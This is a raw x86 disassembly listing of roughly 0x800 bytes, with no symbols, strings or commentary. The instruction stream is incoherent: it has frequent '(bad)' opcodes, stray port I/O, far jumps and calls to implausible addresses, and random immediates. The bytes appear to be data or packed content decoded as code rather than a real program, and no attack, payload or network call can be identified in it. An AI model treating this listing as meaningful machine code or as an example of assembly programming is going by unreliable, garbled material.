  420e8e:	lahf   
  420e8f:	mov    al,0x10
  420e91:	xor    bh,BYTE PTR [ebx-0x5bdc28e8]
  420e97:	fld    QWORD PTR [esi]
  420e9a:	adc    eax,0x68142edf
  420e9f:	ins    BYTE PTR es:[edi],dx
  420ea0:	dec    ebx
  420ea1:	push   DWORD PTR [edi-0x24]
  420ea4:	mov    ah,0x5a
  420ea6:	sbb    bl,BYTE PTR [eax-0x48]
  420ea9:	or     BYTE PTR [edi+ebx*8+0x50],0x7
  420eae:	nop
  420eaf:	stos   BYTE PTR es:[edi],al
  420eb0:	mov    eax,ds:0x1a4be52
  420eb5:	(bad)  
  420eb7:	enter  0xc8,0x0
  420ebb:	add    BYTE PTR [eax],al
  420ebd:	add    BYTE PTR [eax],al
  420ebf:	jecxz  0x420e62
  420ec1:	in     eax,dx
  420ec2:	addr16 nop
  420ec4:	fwait
  420ec5:	adc    DWORD PTR [eax+0x302ea737],eax
  420ecb:	sbb    edi,eax
  420ecd:	cs sub al,0x1b
  420ed0:	xor    BYTE PTR [eax-0x18],ch
  420ed3:	pop    ds
  420ed4:	outs   dx,BYTE PTR ds:[esi]
  420ed5:	lods   eax,DWORD PTR ds:[esi]
  420ed6:	adc    eax,edx
  420ed8:	fwait
  420ed9:	push   0x75b213ef
  420ede:	inc    esi
  420edf:	xor    ebp,0xffffffa8
  420ee2:	mov    dl,0x60
  420ee4:	sbb    dl,bh
  420ee6:	mov    dl,0x5d
  420ee8:	(bad)  
  420ee9:	loop   0x420e82
  420eeb:	xor    edx,0x36df7af7
  420ef1:	sub    al,0xd0
  420ef3:	xchg   esi,eax
  420ef4:	in     al,0x24
  420ef6:	lock aaa 
  420ef8:	mov    al,ds:0xd8b903b7
  420efd:	pusha  
  420efe:	mov    edi,0xd30cae73
  420f03:	lahf   
  420f04:	loope  0x420eae
  420f06:	fst    DWORD PTR [ebx+0x77f01ce5]
  420f0c:	mov    eax,ds:0x9a1903b7
  420f11:	jb     0x420f6b
  420f13:	and    ebp,DWORD PTR [eax+esi*2+0x70ae73bf]
  420f1a:	mov    bh,0xb3
  420f1c:	mov    ds:0xe5a7d4f4,al
  420f21:	mov    edi,0xa9
  420f26:	add    BYTE PTR [eax],al
  420f28:	jp     0x420eb6
  420f2a:	les    edi,FWORD PTR [edx+0x5f]
  420f2d:	ss stos BYTE PTR es:[edi],al
  420f2f:	rcl    BYTE PTR [ebp+eiz*8-0x6044102c],1
  420f36:	aaa    
  420f37:	add    al,0x13
  420f39:	mov    WORD PTR [ebx],gs
  420f3b:	std    
  420f3c:	mov    esp,0xa1e3c28b
  420f41:	repnz idiv DWORD PTR [esi+0x3d]
  420f45:	pop    es
  420f46:	cld    
  420f47:	cmp    BYTE PTR ds:0xddfd0b8c,0x8b
  420f4e:	loop   0x420f33
  420f50:	xor    edx,0xedc5a4f7
  420f56:	popa   
  420f57:	inc    ecx
  420f58:	mov    eax,0x14ab0ee9
  420f5d:	mov    WORD PTR [ebx+0x16],es
  420f60:	mov    DWORD PTR [ebp+ebp*8+0x4ebb97fc],ebx
  420f67:	jmp    0x1e3b92e4
  420f6c:	mov    eax,ds:0xaa634e72
  420f71:	(bad)  
  420f72:	out    dx,al
  420f73:	ins    BYTE PTR es:[edi],dx
  420f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f75:	push   DWORD PTR [edi]
  420f77:	(bad)  
  420f78:	in     al,0x4d
  420f7a:	shl    BYTE PTR [esi+ebx*1-0x5e],1
  420f7e:	je     0x420fea
  420f80:	push   esp
  420f81:	int3   
  420f82:	aas    
  420f83:	(bad)
  420f87:	hlt    
  420f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f89:	mov    ebx,0xe94e
  420f8e:	add    BYTE PTR [eax],al
  420f90:	add    BYTE PTR [eax],dl
  420f92:	test   BYTE PTR [ecx],dl
  420f94:	xchg   ebp,eax
  420f95:	jb     0x420fc8
  420f97:	out    0xed,al
  420f99:	xlat   BYTE PTR ds:[ebx]
  420f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f9b:	xchg   ecx,eax
  420f9c:	add    DWORD PTR [edx-0x2a4eec01],edx
  420fa2:	mov    ebx,0xf5d5db6b
  420fa7:	(bad)  
  420fa8:	jb     0x420fdf
  420faa:	mov    ebx,0x769e38e
  420faf:	rcr    BYTE PTR [ebx],1
  420fb1:	int3   
  420fb2:	out    dx,al
  420fb3:	dec    esp
  420fb4:	stos   DWORD PTR es:[edi],eax
  420fb5:	outs   dx,DWORD PTR ds:[esi]
  420fb6:	mov    ebx,DWORD PTR [eax-0x64414fcb]
  420fbc:	daa    
  420fbd:	bound  esi,QWORD PTR [edi+ecx*2]
  420fc0:	in     eax,dx
  420fc1:	fdivrp st(5),st
  420fc3:	or     ah,BYTE PTR [esi-0x16ec4cae]
  420fc9:	xchg   ebx,eax
  420fca:	mov    dl,0x93
  420fcc:	test   eax,0x282fb04e
  420fd1:	inc    eax
  420fd2:	call   0x99:0xb7526004
  420fd9:	jns    0x420f69
  420fdb:	nop
  420fdc:	shl    BYTE PTR [edi+edi*2],0x1e
  420fe0:	shl    BYTE PTR [eax-0x4738e2c0],cl
  420fe6:	sub    ah,0xff
  420fe9:	stc    
  420fea:	scas   al,BYTE PTR es:[edi]
  420feb:	sahf   
  420fec:	add    DWORD PTR [edx-0x35],esp
  420fef:	push   ds
  420ff0:	div    BYTE PTR [edx-0x23]
  420ff3:	jae    0x42102e
  420ff5:	add    BYTE PTR [eax],al
  420ff7:	add    BYTE PTR [eax],al
  420ff9:	add    BYTE PTR [ecx-0x28bded85],cl
  420fff:	mov    bh,0x5e
  421001:	add    ah,BYTE PTR ds:0xebc08f11
  421007:	jmp    0xe3746606
  42100c:	mov    fs,esp
  42100e:	jno    0x421040
  421010:	stc    
  421011:	or     al,0xab
  421013:	scas   al,BYTE PTR es:[edi]
  421014:	push   cs
  421015:	push   ebx
  421016:	test   DWORD PTR [ecx],0x31e60c61
  42101c:	imul   ebx,DWORD PTR [ecx+edi*4],0x7
  421020:	pop    edx
  421021:	and    al,0xad
  421023:	jnp    0x421089
  421025:	sbb    DWORD PTR [edi],0xd9000ecf
  42102b:	mov    ch,0x63
  42102d:	jo     0x421027
  42102f:	je     0x42103e
  421031:	add    BYTE PTR [eax-0x4a],ch
  421034:	push   cs
  421035:	jb     0x420ffd
  421037:	and    ebp,DWORD PTR [ebx+0x2c]
  42103a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42103b:	cmc    
  42103c:	add    BYTE PTR [edx+ecx*2-0x7b75128a],cl
  421043:	mov    dh,0x43
  421045:	lea    ebp,[ebp+0x218b019a]
  42104b:	xlat   BYTE PTR ds:[ebx]
  42104c:	jbe    0x42109b
  42104e:	out    dx,al
  42104f:	cmc    
  421050:	nop
  421051:	shl    BYTE PTR [ebp-0x6f346988],0x33
  421058:	adc    BYTE PTR [ebx-0x6f],cl
  42105b:	fwait
  42105c:	xchg   esp,eax
  42105d:	test   DWORD PTR [eax],0x0
  421063:	lea    eax,[esi-0x2318f2d0]
  421069:	sbb    al,BYTE PTR [ecx+0x2a58418]
  42106f:	adc    eax,DWORD PTR [ebx+ecx*8]
  421072:	jb     0x421015
  421074:	dec    edx
  421075:	pushf  
  421076:	dec    ebx
  421077:	mov    ah,0x8b
  421079:	jle    0x4210be
  42107b:	lods   al,BYTE PTR ds:[esi]
  42107c:	xchg   ecx,eax
  42107e:	out    0x86,eax
  421080:	not    BYTE PTR [ecx-0x4]
  421083:	sti    
  421084:	sbb    BYTE PTR [ebx+ecx*2-0x7538684c],0x4c
  42108c:	mov    bh,0x6
  42108e:	push   eax
  42108f:	mov    eax,0xc7fc4f83
  421094:	pop    ss
  421095:	push   ebx
  421096:	jae    0x421024
  421098:	push   ss
  421099:	(bad)  
  42109a:	and    esp,DWORD PTR [eax-0x473663b8]
  4210a0:	mov    esi,0x50a7ff0f
  4210a5:	out    dx,eax
  4210a6:	scas   eax,DWORD PTR es:[edi]
  4210a7:	xchg   ecx,eax
  4210a8:	push   esp
  4210a9:	pushf  
  4210aa:	loop   0x4210e1
  4210ac:	fstp   QWORD PTR [edx]
  4210ae:	add    dh,ah
  4210b0:	adc    al,0x24
  4210b2:	push   esp
  4210b3:	sbb    ecx,ecx
  4210b5:	sbb    al,BYTE PTR [edx-0x15]
  4210b8:	dec    ebp
  4210b9:	mov    cl,0x8a
  4210bb:	(bad)  
  4210bc:	xchg   edi,eax
  4210bd:	cmp    DWORD PTR [ebx-0x7bee64f2],esp
  4210c3:	push   eax
  4210c4:	(bad)  
  4210c5:	pop    ss
  4210c6:	add    DWORD PTR [eax],0x0
  4210cc:	dec    eax
  4210cd:	dec    eax
  4210ce:	cmp    al,0x26
  4210d0:	adc    edi,DWORD PTR [edi-0x406ff40a]
  4210d6:	or     ecx,DWORD PTR [ecx-0x51204d32]
  4210dc:	call   DWORD PTR [ecx]
  4210de:	stc    
  4210df:	leave  
  4210e0:	xchg   ebx,eax
  4210e1:	sbb    al,0x18
  4210e3:	inc    ebx
  4210e4:	mov    ds:0x24d3e7ce,eax
  4210e9:	lahf   
  4210ea:	xor    ebx,DWORD PTR [edx]
  4210ec:	shl    BYTE PTR [edx+0x3d8b4778],1
  4210f2:	cmp    eax,0xf6fa1b0c
  4210f7:	mov    WORD PTR [ebp-0x46],ss
  4210fa:	aam    0xe1
  4210fc:	shr    DWORD PTR [ebp-0x7cf72609],1
  421102:	jo     0x4210d3
  421104:	mov    bl,0xba
  421106:	jo     0x4210d1
  421108:	(bad)  
  421109:	sbb    eax,0x7268a31f
  42110e:	xlat   BYTE PTR ds:[ebx]
  42110f:	fimul  DWORD PTR [edx]
  421111:	or     ah,bh
  421113:	push   es
  421114:	popf   
  421115:	mov    ch,0xf4
  421117:	(bad)  
  421118:	xchg   esp,eax
  421119:	add    al,0xe1
  42111b:	ror    DWORD PTR [edx],cl
  42111d:	jecxz  0x4210b6
  42111f:	sub    eax,esi
  421121:	sub    bh,dh
  421123:	add    edi,DWORD PTR [ecx+0x1343c9b3]
  421129:	jb     0x421196
  42112b:	adc    ebx,DWORD PTR [ebp+0x8edff7]
  421131:	add    BYTE PTR [eax],al
  421133:	add    BYTE PTR [eax],al
  421135:	cmp    eax,0xef5590ba
  42113a:	cmp    ecx,DWORD PTR [ebx+ebp*1]
  42113d:	mov    bh,0x28
  42113f:	test   DWORD PTR [ebx],0x8b9e8dd
  421145:	nop
  421146:	cmp    ebp,DWORD PTR [ebx]
  421148:	call   0xc68dce0
  42114d:	loope  0x421107
  42114f:	pop    esi
  421150:	rcl    DWORD PTR [edi+0x10a48a1b],cl
  421156:	jb     0x421166
  421158:	in     eax,dx
  421159:	jnp    0x4210fe
  42115b:	mov    ecx,gs
  42115d:	xchg   ebx,eax
  42115e:	je     0x421172
  421160:	jmp    0x34840ac7
  421165:	pop    edx
  421166:	cmp    esp,DWORD PTR [ebx]
  421168:	dec    ecx
  421169:	xchg   dl,dh
  42116b:	push   cs
  42116c:	ss adc eax,0xcc17661
  421172:	enter  0x7e0e,0x1d
  421176:	xchg   esp,eax
  421178:	add    eax,ebp
  42117a:	cmp    cl,BYTE PTR [esi-0x17]
  42117d:	push   eax
  42117e:	ret    0x5199
  421181:	push   ecx
  421182:	pop    ebp
  421183:	and    DWORD PTR [edi+0x5],edx
  421186:	adc    BYTE PTR [ebx-0x6c23d7bc],0x4e
  42118d:	sub    al,dl
  42118f:	fwait
  421190:	lods   eax,DWORD PTR ds:[esi]
  421191:	mul    DWORD PTR [ebx+0x350973e]
  421197:	xor    ecx,DWORD PTR ds:0x0
  42119d:	add    BYTE PTR [ecx+0x64],dl
  4211a0:	xchg   ebx,eax
  4211a1:	sub    edi,edi
  4211a3:	lahf   
  4211a4:	aas    
  4211a5:	es clc 
  4211a7:	shl    DWORD PTR [edx],cl
  4211a9:	jb     0x4211f0
  4211ab:	xchg   BYTE PTR [edx-0x33],ah
  4211ae:	(bad)  
  4211af:	call   0x7ded:0xb293e901
  4211b6:	mov    bh,0xa3
  4211b8:	cdq    
  4211b9:	stc    
  4211ba:	push   eax
  4211bb:	pop    esi
  4211bc:	dec    ebp
  4211bd:	(bad)  
  4211be:	(bad)  
  4211c0:	dec    ebx
  4211c1:	xchg   edx,eax
  4211c2:	push   0xffffffe0
  4211c4:	shl    ch,1
  4211c6:	xchg   ebx,eax
  4211c7:	xor    edx,edi
  4211c9:	xor    DWORD PTR [ebp-0x1c],ebx
  4211cc:	inc    esp
  4211cd:	bound  esp,QWORD PTR [esi+0x27]
  4211d0:	add    BYTE PTR [ecx],ch
  4211d2:	mov    ebp,ds
  4211d4:	cdq    
  4211d5:	add    BYTE PTR [eax+0x5b],dl
  4211d8:	jne    0x421165
  4211da:	test   eax,0xfe37ebae
  4211df:	outs   dx,BYTE PTR ds:[esi]
  4211e0:	xor    DWORD PTR [edi+edx*2],ebp
  4211e3:	mov    bl,0xe
  4211e5:	add    dh,dh
  4211e7:	call   0x74049661
  4211ec:	in     eax,dx
  4211ed:	dec    BYTE PTR [esi+0x36]
  4211f0:	cmc    
  4211f1:	(bad)  
  4211f2:	fistp  WORD PTR [edx-0x77]
  4211f5:	mov    ebp,DWORD PTR [ecx-0x52]
  4211f8:	jmp    0x421231
  4211fa:	mov    ds:0x72d6eaeb,al
  4211ff:	ret    
  421200:	xchg   esp,eax
  421201:	je     0x421203
  421203:	add    BYTE PTR [eax],al
  421205:	add    BYTE PTR [eax],al
  421207:	int    0x92
  421209:	nop
  42120a:	in     eax,dx
  42120b:	push   es
  42120c:	das    
  42120d:	dec    eax
  42120e:	add    ecx,ebp
  421210:	mov    dl,0x91
  421212:	fcomi  st,st(6)
  421214:	cs inc eax
  421216:	add    ecx,edi
  421218:	mov    dl,0x91
  42121a:	mul    dh
  42121c:	cs pop eax
  42121e:	add    ecx,ebp
  421220:	mov    dl,0x1f
  421222:	shl    BYTE PTR [eax],0x6f
  421225:	xor    DWORD PTR [eax],ebx
  421227:	xor    BYTE PTR [edi+0x31],ch
  42122a:	adc    al,0x40
  42122c:	outs   dx,DWORD PTR ds:[esi]
  42122d:	xor    DWORD PTR [esp],ebx
  421230:	outs   dx,DWORD PTR ds:[esi]
  421231:	xor    DWORD PTR [ecx+ebp*8],ebx
  421234:	aaa    
  421235:	push   ecx
  421236:	and    al,0xa1
  421238:	(bad)  
  421239:	jmp    0xcc85:0x1af32cd5
  421240:	mov    bl,0xe
  421242:	add    dl,dh
  421244:	jne    0x421277
  421246:	sbb    al,0xec
  421248:	clc    
  421249:	sbb    al,BYTE PTR [eax+edx*4-0x4ffff151]
  421250:	jp     0x421283
  421252:	adc    al,0x90
  421254:	mov    WORD PTR [ebp+0x119b910c],ss
  42125a:	call   0x552155
  42125f:	or     esi,DWORD PTR [edi+edx*4-0x4]
  421263:	lahf   
  421264:	pop    ss
  421265:	adc    edi,edi
  421267:	inc    edi
  421268:	pushf  
  421269:	(bad)  
  42126a:	cld    
  42126b:	add    BYTE PTR [eax],al
  42126d:	add    BYTE PTR [eax],al
  42126f:	add    ah,al
  421271:	ja     0x421264
  421273:	cld    
  421274:	mov    esp,0x43fd0d6f
  421279:	imul   ebx,DWORD PTR [esi],0xd39f5082
  42127f:	mov    BYTE PTR ds:0x7c23a573,ah
  421285:	jge    0x42126d
  421287:	mov    ch,BYTE PTR [edi+0x4b]
  42128a:	sub    al,0x30
  42128c:	pop    es
  42128d:	xor    ch,0x63
  421290:	inc    DWORD PTR [esi-0x64aff0eb]
  421296:	xchg   esi,eax
  421297:	mov    edi,0x80d38f64
  42129c:	shl    DWORD PTR [edi],cl
  42129e:	call   0x9fa9c716
  4212a3:	in     eax,0xeb
  4212a5:	pop    ebp
  4212a6:	mov    eax,0x1715cf5
  4212ab:	add    DWORD PTR [edi+0x74437e1d],edi
  4212b1:	imul   eax,ecx,0xffffffe7
  4212b4:	aas    
  4212b5:	push   es
  4212b6:	adc    eax,DWORD PTR [eax]
  4212b8:	sbb    DWORD PTR [eax],esi
  4212ba:	cmc    
  4212bb:	adc    ebx,DWORD PTR [ebx]
  4212bd:	and    ch,dh
  4212bf:	pop    ds
  4212c0:	or     edi,DWORD PTR [ebp-0x640ad5c6]
  4212c6:	adc    DWORD PTR [ecx+0x5780c],eax
  4212cc:	xchg   edi,eax
  4212cd:	push   cs
  4212ce:	scas   eax,DWORD PTR es:[edi]
  4212cf:	(bad)  
  4212d0:	jg     0x421284
  4212d2:	not    DWORD PTR [eax+0x0]
  4212d8:	add    bl,dl
  4212da:	into   
  4212db:	paddq  mm4,QWORD PTR [eax-0x3d28c37b]
  4212e2:	test   edx,esp
  4212e4:	jg     0x42126b
  4212e6:	repnz test DWORD PTR [eax-0x788d4ae9],0x8af7854f
  4212f1:	ror    esi,cl
  4212f3:	mov    edi,0x7bb4ff88
  4212f8:	xor    DWORD PTR [edi],0xffffff85
  4212fb:	test   DWORD PTR [edx+0x3dbceab],0xfbd4160f
  421305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421306:	lock add DWORD PTR [eax+ebp*4],edx
  42130a:	ds pusha 
  42130c:	ret    
  42130d:	(bad)  
  42130f:	cmp    ebp,eax
  421311:	push   ebx
  421312:	loop   0x4212a3
  421314:	and    BYTE PTR [ebx],bl
  421316:	mov    dl,0xf7
  421318:	mov    dl,BYTE PTR [ebx-0x32]
  42131b:	das    
  42131c:	stos   DWORD PTR es:[edi],eax
  42131d:	das    
  42131e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42131f:	jb     0x4212f0
  421321:	mov    bl,0xce
  421323:	xor    al,0xc7
  421325:	xchg   ebx,eax
  421326:	loop   0x421323
  421328:	add    edx,DWORD PTR [eax+0x73c760b2]
  42132e:	retf   0x43d0
  421331:	stos   DWORD PTR es:[edi],eax
  421332:	cmp    edi,DWORD PTR [ebx-0x44c6b3f9]
  421338:	out    0x7f,eax
  42133a:	sbb    DWORD PTR [eax],edi
  42133c:	pop    ds
  42133d:	add    BYTE PTR [eax],al
  42133f:	add    BYTE PTR [eax],al
  421341:	add    BYTE PTR [edi],dl
  421343:	idiv   bl
  421345:	xlat   BYTE PTR ds:[ebx]
  421346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421347:	in     eax,dx
  421348:	sar    ebx,cl
  42134a:	or     dh,ch
  42134c:	fistp  DWORD PTR [ebx]
  42134e:	or     esi,esi
  421350:	sar    ebx,cl
  421352:	fidiv  WORD PTR ds:0xd86fa50e
  421358:	aas    
  421359:	cdq    
  42135a:	mov    esi,0xb55132ff
  42135f:	pop    ebp
  421360:	xchg   ebx,eax
  421361:	test   eax,0xf132f019
  421366:	sbb    BYTE PTR [edx+eiz*2+0x3f8743e1],ch
  42136d:	icebp  
  42136e:	or     BYTE PTR [ecx-0x7],dh
  421371:	fldenv [esi-0x1f]
  421374:	inc    ebx
  421375:	sbb    al,0x5c
  421377:	xchg   DWORD PTR [edi],edi
  421379:	aad    0x8
  42137b:	lock xor al,BYTE PTR [ecx]
  42137e:	imul   esi,DWORD PTR [ecx-0x19b256df],0x7011324b
  421388:	push   esi
  421389:	stos   DWORD PTR es:[edi],eax
  42138a:	xor    BYTE PTR [edx+0x32607243],0xf2
  421391:	adc    DWORD PTR [ecx],0xdf1a6e98
  421397:	fld    QWORD PTR [ebp+0x62]
  42139a:	mov    edx,0xcd66df3a
  42139f:	mov    bh,0x8e
  4213a1:	ficomp WORD PTR [ebx+0xe76283]
  4213a7:	add    BYTE PTR [eax],al
  4213a9:	add    BYTE PTR [eax],al
  4213ab:	adc    BYTE PTR [edi],al
  4213ad:	sbb    eax,ebp
  4213af:	and    eax,0xbbeb78ac
  4213b4:	mov    ebx,cs
  4213b6:	jmp    0x93bac64e
  4213bb:	push   ss
  4213bc:	loopne 0x4213f0
  4213be:	or     ebx,ebx
  4213c0:	mov    ecx,DWORD PTR [eax-0x644d73d2]
  4213c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213c7:	mov    bh,0xa7
  4213c9:	inc    esp
  4213ca:	mov    ecx,0xd932f016
  4213cf:	jmp    0x814252c5
  4213d4:	pop    eax
  4213d5:	xlat   BYTE PTR ds:[ebx]
  4213d6:	dec    BYTE PTR [esi-0xbef2ece]
  4213dc:	out    dx,al
  4213dd:	push   0x8
  4213df:	cmp    ch,bh
  4213e1:	sub    eax,0xeaf19e9
  4213e6:	add    BYTE PTR [edx+0x223343bc],cl
  4213ec:	jb     0x42142c
  4213ee:	push   esi
  4213ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213f0:	xor    ecx,edi
  4213f2:	or     al,0xdc
  4213f4:	imul   esi,DWORD PTR [ecx],0x44
  4213f7:	test   eax,0x954c985c
  4213fc:	outs   dx,BYTE PTR ds:[esi]
  4213fd:	xchg   esp,eax
  4213fe:	je     0x421395
  421400:	outs   dx,BYTE PTR ds:[esi]
  421401:	xchg   esp,eax
  421402:	je     0x421449
  421404:	imul   edx,DWORD PTR [esp+esi*2+0x69f57755],0xffffffb5
  42140c:	mov    al,0xe
  42140e:	test   BYTE PTR [eax],al
  421410:	add    BYTE PTR [eax],al
  421412:	add    BYTE PTR [eax],al
  421414:	jmp    0xd7417b53
  421419:	xor    edx,DWORD PTR [ecx+0x24]
  42141c:	icebp  
  42141d:	push   esi
  42141e:	xlat   BYTE PTR ds:[ebx]
  42141f:	or     al,0xf9
  421421:	scas   al,BYTE PTR es:[edi]
  421422:	lea    ebx,ds:[ebp+0x6ae8359a]
  421429:	xor    esp,ebp
  42142b:	push   DWORD PTR [ebp-0x11]
  42142e:	popa   
  42142f:	popa   
  421430:	jb     0x42148d
  421432:	xor    DWORD PTR [eax],ebx
  421434:	jb     0x4214a9
  421436:	xor    DWORD PTR [ecx+eax*2],edx
  421439:	sub    eax,0x39b900e7
  42143e:	pop    ecx
  42143f:	and    al,0xe1
  421441:	cdq    
  421442:	aad    0x89
  421444:	sbb    eax,0x6985058b
  421449:	inc    ebp
  42144a:	sub    BYTE PTR [ebx+0x33385978],cl
  421450:	nop
  421451:	(bad)  
  421452:	enter  0xa1f4,0xf
  421456:	cmp    al,BYTE PTR [edx-0x7d03fa3e]
  42145c:	jge    0x421466
  42145e:	or     cl,BYTE PTR [ecx-0x76fa901c]
  421464:	iret   
  421465:	xchg   edi,eax
  421466:	mov    esi,0x127567e7
  42146b:	add    BYTE PTR [esp+ecx*2],dl
  42146e:	sahf   
  42146f:	dec    ch
  421471:	or     al,0x56
  421473:	sub    cl,ch
  421475:	out    0x36,al
  421477:	mov    BYTE PTR [eax],al
  421479:	add    BYTE PTR [eax],al
  42147b:	add    BYTE PTR [eax],al
  42147d:	les    ebp,FWORD PTR [edi+0x151ce7fe]
  421483:	adc    eax,DWORD PTR [eax]
  421485:	and    DWORD PTR [edi+ecx*4],0xfffffff5
  421489:	(bad)  
  42148a:	out    0x55,eax
  42148c:	call   0x2419191a
  421491:	test   BYTE PTR [ebx],ah
  421493:	lods   al,BYTE PTR ds:[esi]
  421494:	cwde   
  421495:	nop
  421496:	mov    edx,DWORD PTR [esi+0x398f744b]
  42149c:	sub    DWORD PTR [eax],edx
  42149e:	mov    edx,DWORD PTR [ecx]
  4214a0:	mov    ebx,edx
  4214a2:	mov    al,ds:0x146b5ac8
  4214a7:	xor    BYTE PTR [edx-0x2d],bl
  4214aa:	or     dh,BYTE PTR [edi]
  4214ac:	and    ecx,DWORD PTR [esi-0x5caeee75]
  4214b2:	hlt    
  4214b3:	mov    edi,0xee201b55
  4214b8:	xor    edx,DWORD PTR [esi+0xb55118b]
  4214be:	repz fwait
  4214c0:	jnp    0x421536
  4214c2:	mov    bh,0x9b
  4214c4:	pop    ebx
  4214c5:	ins    BYTE PTR es:[edi],dx
  4214c6:	mov    bl,0x9b
  4214c8:	pop    ebx
  4214c9:	je     0x42154a
  4214cb:	call   0x4b8d:0x13b26c5b
  4214d2:	(bad)  
  4214d3:	xlat   BYTE PTR ds:[ebx]
  4214d4:	mov    WORD PTR [ebx-0x2a],cs
  4214d7:	mov    ebx,0xafd63b8c
  4214dc:	mov    WORD PTR [ebx],?
  4214de:	(bad)  
  4214df:	rol    DWORD PTR [eax+0x0],cl
  4214e5:	add    BYTE PTR [ebp+0x160a8606],al
  4214eb:	and    esi,edi
  4214ed:	add    edx,DWORD PTR [eax-0x9fa02cb]
  4214f3:	lahf   
  4214f4:	js     0x42152f
  4214f6:	nop
  4214f7:	mov    cl,0x72
  4214f9:	xchg   BYTE PTR [edi-0x7f],ah
  4214fc:	test   DWORD PTR [esi+0x21bd613],0xd406b290
  421506:	sbb    ch,dh
  421508:	adc    esp,eax
  42150a:	das    
  42150b:	lods   eax,DWORD PTR ds:[esi]
  42150c:	add    DWORD PTR [ebx],0x8f2c8d90
  421512:	int3   
  421513:	mov    dh,0x78
  421515:	cmp    DWORD PTR [ecx+0x2697672d],edx
  42151b:	xor    edi,0xfbd6d388
  421521:	mov    ebx,ss
  421523:	(bad)  
  421524:	sbb    ecx,DWORD PTR [ecx-0x2be829ad]
  42152a:	push   esi
  42152b:	sub    ecx,DWORD PTR [ebx]
  42152d:	loopne 0x4215a6
  42152f:	mov    cl,0x43
  421531:	mov    edi,0xd75f02b3
  421536:	mov    bl,0x6
  421538:	inc    eax
  421539:	xchg   esp,eax
  42153a:	shl    BYTE PTR [ecx+0x2f9e2ef7],cl
  421540:	dec    ebx
  421541:	fisttp WORD PTR [edi]
  421543:	mov    dl,0xf7
  421545:	add    edi,DWORD PTR [eax+0x34f37]
  42154b:	add    BYTE PTR [eax],al
  42154d:	add    BYTE PTR [eax],al
  42154f:	nop
  421550:	or     al,0xf
  421552:	fisttp QWORD PTR [eax]
  421554:	cmp    eax,0xb28dca32
  421559:	push   cs
  42155a:	(bad)
  42155e:	lds    esi,FWORD PTR [ebx-0x6ccdea68]
  421564:	mov    dl,0x91
  421566:	es test al,0xeb
  421569:	arpl   cx,di
  42156b:	cmp    dl,BYTE PTR [ebx+edx*1-0x17]
  42156f:	xchg   ebx,eax
  421570:	sub    edx,DWORD PTR [edx-0x127fe833]
  421576:	jmp    0xfd3005d9
  42157b:	xor    esp,DWORD PTR [esi-0x3eb16b2]
  421581:	xor    bl,BYTE PTR [ecx]
  421583:	adc    eax,0x49621a74
  421588:	mov    ah,0x78
  42158a:	call   0x97509a5
  42158f:	pop    esp
  421590:	cwde   
  421591:	cwde   
  421592:	bound  edx,QWORD PTR [edx+esi*4-0x5fcff2d9]
  421599:	arpl   ax,si
  42159b:	sbb    ebx,esp
  42159d:	xor    dh,bh
  42159f:	jp     0x421577
  4215a1:	adc    ecx,ebp
  4215a3:	xchg   ebx,eax
  4215a4:	sub    ecx,edi
  4215a6:	pusha  
  4215a7:	cmp    ah,dl
  4215a9:	push   ds
  4215aa:	jo     0x4215e4
  4215ac:	aam    0x6
  4215ae:	xchg   ecx,eax
  4215af:	push   edx
  4215b0:	pop    ebp
  4215b1:	push   cs
  4215b2:	jmp    0x4215b7
  4215b7:	add    BYTE PTR [edx],cl
  4215b9:	hlt    
  4215ba:	xor    bl,BYTE PTR ds:0xdc117e0d
  4215c0:	sub    edi,0x41
  4215c3:	rcl    DWORD PTR [edi-0x405a6424],cl
  4215c9:	sti    
  4215ca:	neg    BYTE PTR [ebx-0x47]
  4215cd:	jg     0x4215bc
  4215cf:	add    BYTE PTR [edx-0x5d],ah
  4215d2:	js     0x4215e8
  4215d4:	sub    DWORD PTR [ecx],edi
  4215d6:	push   ecx
  4215d7:	and    al,0x5
  4215d9:	fs jmp 0x3a00:0x4ea20515
  4215e1:	repnz sbb DWORD PTR [ebx+0x6a395ffd],ecx
  4215e8:	lods   eax,DWORD PTR ds:[esi]
  4215e9:	ss jmp 0x4215ed
  4215ec:	loopne 0x421598
  4215ee:	pop    edx
  4215ef:	dec    esp
  4215f0:	pop    ebp
  4215f1:	xchg   ebx,eax
  4215f2:	mov    ?,WORD PTR [ebp+ecx*2-0x6d]
  4215f6:	in     eax,dx
  4215f7:	xchg   DWORD PTR ds:0x1589035f,esp
  4215fd:	pop    edi
  4215fe:	and    DWORD PTR [ecx+0xf5d92d5],ecx
  421604:	imul   DWORD PTR [edi+0xf]
  421607:	add    BYTE PTR [ecx+0x2e],ch
  42160a:	shr    BYTE PTR [ebx+0x29],1
  42160d:	scas   eax,DWORD PTR es:[edi]
  42160e:	xchg   ebp,eax
  42160f:	inc    esp
  421610:	popf   
  421611:	pop    esi
  421612:	xchg   esi,eax
  421613:	repz shl BYTE PTR [edi+0x31],0x54
  421618:	lods   al,BYTE PTR ds:[esi]
  421619:	in     al,dx
  42161a:	sbb    cl,BYTE PTR [esi+0x0]
  421620:	add    BYTE PTR [eax-0x4b],al
  421623:	push   cs
  421624:	add    BYTE PTR [edx+0x5de8116a],ah
  42162a:	sub    ch,ch
  42162c:	jmp    FWORD PTR [ebp+0x50841af3]
  421632:	mov    ch,0xe
  421634:	add    BYTE PTR [edx-0x5e3ceb9],al
  42163a:	mov    eax,0x7acd7c94
  42163f:	xchg   esi,eax
  421640:	rep ins BYTE PTR es:[edi],dx
  421642:	fsub   DWORD PTR [ecx+0x34]
  421645:	bound  edx,QWORD PTR [edi+0x31]
  421648:	xor    BYTE PTR [edx+0x67],ah
  42164b:	xor    DWORD PTR [eax],ebx
  42164d:	nop
  42164e:	push   ss
  42164f:	iret   
  421650:	pop    es
  421651:	or     DWORD PTR [ebp-0x33],edx
  421654:	aas    
  421655:	sbb    esi,ecx
  421657:	mov    ebx,0x26285d13
  42165c:	adc    dh,BYTE PTR [edi+ebx*2]
  42165f:	sar    edi,1
  421661:	adc    dl,ch
  421663:	adc    eax,0x191cd083
  421668:	inc    esi
